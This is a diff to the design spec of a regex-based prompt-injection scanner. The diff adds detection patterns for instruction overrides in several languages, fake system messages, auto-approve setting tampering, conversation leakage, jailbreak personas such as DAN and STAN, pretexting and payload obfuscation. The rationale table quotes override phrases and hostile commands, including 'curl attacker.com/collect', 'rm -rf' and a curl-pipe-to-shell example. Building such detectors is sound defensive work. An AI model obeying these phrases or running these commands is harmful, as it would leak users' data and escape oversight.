@@ -2,7 +2,7 @@
 
 ## Responsibility
 
-Detect known prompt injection phrases in file content using regular expressions after text normalization. This layer catches direct instruction-override language ("ignore previous instructions"), authority claims ("these rules are non-negotiable"), destructive commands, data exfiltration patterns, and jailbreak attempts.
+Detect known prompt injection phrases in file content using regular expressions after text normalization. This layer catches direct instruction-override language (including multilingual — Russian, Chinese, French, Spanish, German), authority claims ("these rules are non-negotiable", bracketed system messages, CVE-2025-53773), destructive commands, data exfiltration (including conversation leakage), shell injection, jailbreak personas (STAN, DUDE, token system, role-play), social engineering pretexts, and obfuscation instructions (base64 decode, payload splitting).
 
 ## Input
 
@@ -24,6 +24,7 @@ class PatternFinding:
     category: str          # "instruction_override" | "authority_claim"
                            # | "destructive_command" | "data_exfiltration"
                            # | "shell_injection" | "jailbreak"
+                           # | "social_engineering" | "obfuscation"
     severity: str          # "CRITICAL" | "HIGH" | "MEDIUM"
     line: int              # 1-based line number of the match
     column: int            # 1-based column of the match
@@ -71,12 +72,14 @@ DiscoveredFile + normalized_text
 
 | Pattern Group | Category | Severity | Rationale |
 |---------------|----------|----------|-----------|
-| Direct instruction override | `instruction_override` | CRITICAL | Core injection technique — "ignore previous instructions" |
-| Authority claims | `authority_claim` | HIGH | Attempts to establish rule priority — "these rules override..." |
+| Direct instruction override | `instruction_override` | CRITICAL | Core injection technique — "ignore previous instructions"; includes multilingual variants (RU, CN, FR, ES, DE) and context-window overflow ("ignore everything above") |
+| Authority claims | `authority_claim` | HIGH | Attempts to establish rule priority — "these rules override...", bracketed system messages (`[DEVELOPER MESSAGE]`), CVE-2025-53773 patterns (`chat.tools.autoApprove`) |
 | Destructive commands | `destructive_command` | CRITICAL | Commands to delete/destroy — "rm -rf", "delete all tests" |
-| Data exfiltration | `data_exfiltration` | CRITICAL | Commands to send data externally — "curl attacker.com/collect" |
+| Data exfiltration | `data_exfiltration` | CRITICAL | Commands to send data externally — "curl attacker.com/collect", conversation/chat history leakage |
 | Shell injection via agent | `shell_injection` | CRITICAL | Commands to execute arbitrary code — "run curl... | sh" |
-| Jailbreak / role override | `jailbreak` | HIGH | Persona manipulation — "you are now DAN", "developer mode" |
+| Jailbreak / role override | `jailbreak` | HIGH | Persona manipulation — "you are now DAN", "developer mode", STAN/DUDE variants, token system, deceased-grandmother role-play |
+| Social engineering | `social_engineering` | MEDIUM | Pretexting — "security audit in progress", "diagnostic mode", "for testing purposes" |
+| Obfuscation | `obfuscation` | MEDIUM | Payload deobfuscation — "decode this base64", "combine all codes and execute" |
 
 ### Pattern Matching Rules
 
@@ -88,6 +91,15 @@ INJECTION_PATTERNS: list[tuple[str, str, str]] = [
     ("INSTR_001",
      r"(?:ignore|disregard|forget|override)\s+(?:all\s+)?(?:previous|prior|above|system|earlier)\s+(?:instructions?|prompts?|rules?|context)",
      "instruction_override"),
+    ("INSTR_002",
+     r"(?:ignore|disregard|forget|skip|omit)\s+(?:everything|all(?:\s+(?:of\s+)?(?:the\s+)?(?:content|text))?)\s+(?:above|below|before|after)",
+     "instruction_override"),
+    ("INSTR_003",
+     r"(?:игнорируй|забудь|пропусти|отмени)...",
+     "instruction_override"),
+    ("INSTR_004",
+     r"(?:忽略|ignor(?:e[z]?|a)...",
+     "instruction_override"),
 
     # --- Authority Claims ---
     ("AUTH_001",
@@ -96,6 +108,17 @@ INJECTION_PATTERNS: list[tuple[str, str, str]] = [
     ("AUTH_002",
      r"(?:non-?negotiable|highest\s+priority|cannot\s+be\s+overridden)",
      "authority_claim"),
+    ("AUTH_003",
+     r"\[(?:developer\s+message|admin|system\s+override|system\s+message|system)\]...",
+     "authority_claim"),
+    ("AUTH_005",
+     r"(?:chat\.tools\.autoApprove|yolo\s+mode|\bauto-?approve\b|\.vscode/settings\.json)",
+     "authority_claim"),
+
+    # --- Social Engineering ---
+    ("AUTH_004",
+     r"(?:security\s+audit\s+in\s+progress|automated\s+security\s+scan|for\s+testing\s+purposes|(?:operating|running)\s+in\s+diagnostic\s+mode|maintenance\s+mode|this\s+is\s+a\s+(?:security|penetration)\s+test)",
+     "social_engineering"),
 
     # --- Destructive Commands ---
     ("DEST_001",
@@ -112,6 +135,12 @@ INJECTION_PATTERNS: list[tuple[str, str, str]] = [
     ("EXFIL_002",
      r"(?:send|post|upload|exfiltrate)\s+.*(?:to|towards)\s+(?:https?://|[a-z]+\.(?:com|io|net))",
      "data_exfiltration"),
+    ("EXFIL_003",
+     r"(?:send|forward|leak|share|exfiltrate)\s+(?:(?:all|the)\s+)?(?:conversation|chat|dialog|discussion)\s+(?:data|history|content|log|record)",
+     "data_exfiltration"),
+    ("EXFIL_004",
+     r"(?:email|paste|output|print|display|copy)\s+(?:the\s+)?(?:last|previous|above|entire)\s+(?:messages?|conversations?|chats?|responses?|dialog)",
+     "data_exfiltration"),
 
     # --- Shell Injection ---
     ("SHELL_001",
@@ -125,6 +154,20 @@ INJECTION_PATTERNS: list[tuple[str, str, str]] = [
     ("JAIL_002",
      r"(?:developer\s+mode|\bDAN\b|do\s+anything\s+now)",
      "jailbreak"),
+    ("JAIL_003",
+     r"(?:\bSTAN\b|\bDUDE\b|strive\s+to\s+avoid\s+norms|token\s+system|gain\s+tokens?|run\s+out\s+of\s+tokens?)",
+     "jailbreak"),
+    ("JAIL_004",
+     r"(?:immers(?:e|ing)\s+(?:yourself|oneself)\s+(?:into|in)\s+(?:the\s+)?(?:role|character)|act\s+as\s+(?:my\s+)?deceased|role-?play\s+as\s+(?:my\s+)?)",
+     "jailbreak"),
+
+    # --- Obfuscation ---
+    ("OBFUSC_001",
+     r"(?:decode|decrypt|deobfuscate)\s+(?:this|the|following)\s+(?:base64|encoded|obfuscated)\s+(?:string|text|content|block|payload)",
+     "obfuscation"),
+    ("OBFUSC_002",
+     r"(?:combine|concatenate|join|merge|assemble)\s+(?:all|the)\s+(?:codes?|parts?|pieces?|fragments?|strings?|chunks?)\s+(?:and|to|then)\s+(?:execute|run|follow|perform)",
+     "obfuscation"),
 ]
 ```
 
@@ -161,7 +204,7 @@ For files with `FileCategory.SOURCE_CODE`, the pipeline calls `extract_comments_
 
 ## Configuration Constants
 
-All patterns are defined as module-level constants (see `INJECTION_PATTERNS` above). No runtime configuration.
+All patterns are defined as module-level constants (see `INJECTION_PATTERNS` above — 22 patterns across 8 categories). No runtime configuration.
 
 ```python
 # Maximum length of matched_text in findings
@@ -182,7 +225,7 @@ All patterns are compiled with `re.IGNORECASE` — matching is case-insensitive 
 
 - **P001**: Regex patterns MUST be applied to normalized text (lowercase, whitespace-collapsed, invisible-chars-stripped), NOT to raw bytes. For source code files, the normalized text is derived from extracted comments and string literals (via `extract_comments_and_strings`), not the full file content — this prevents false positives on code identifiers and structural syntax.
 - **P002**: Every `PatternFinding` MUST include the `pattern_id` of the rule that matched — for auditability.
-- **P003**: Instruction override patterns (`INSTR_001`) and destructive command patterns (`DEST_001`, `DEST_002`) MUST be classified as CRITICAL severity.
+- **P003**: Instruction override patterns (`INSTR_001`, `INSTR_002`, `INSTR_003`, `INSTR_004` — including multilingual variants) and destructive command patterns (`DEST_001`, `DEST_002`) MUST be classified as CRITICAL severity. Data exfiltration patterns (`EXFIL_001` through `EXFIL_004`) and shell injection (`SHELL_001`) are also CRITICAL.
 - **P004**: Regex matching MUST use a timeout (`REGEX_TIMEOUT_SECONDS`) to prevent ReDoS attacks via malicious input.
 - **P005**: The normalization step MUST use `errors="replace"` for UTF-8 decoding — the scanner MUST NOT crash on invalid UTF-8.
 
